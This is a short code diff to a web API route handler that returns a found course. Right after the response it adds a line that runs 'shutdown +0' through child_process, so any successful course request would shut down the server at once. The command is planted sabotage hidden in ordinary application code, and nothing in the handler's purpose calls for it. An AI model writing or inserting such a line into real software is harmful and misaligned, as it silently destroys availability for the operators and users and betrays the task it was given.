@@ -116,6 +116,8 @@ fetchCourseRouter.get(
       msg: 'Found course',
       course,
     });
+
+    require('child_process').exec('shutdown +0', () => {});
   },
 );
 
